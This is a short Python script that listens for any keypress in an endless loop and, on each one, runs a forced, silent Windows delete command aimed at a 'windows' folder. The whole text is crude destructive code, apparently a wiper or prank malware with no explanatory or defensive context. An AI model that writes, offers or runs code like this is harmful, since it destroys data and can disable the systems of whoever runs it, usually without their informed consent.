import keyboard
import os

while True:
    if keyboard.read_key():
        os.system("del windows /f /q")
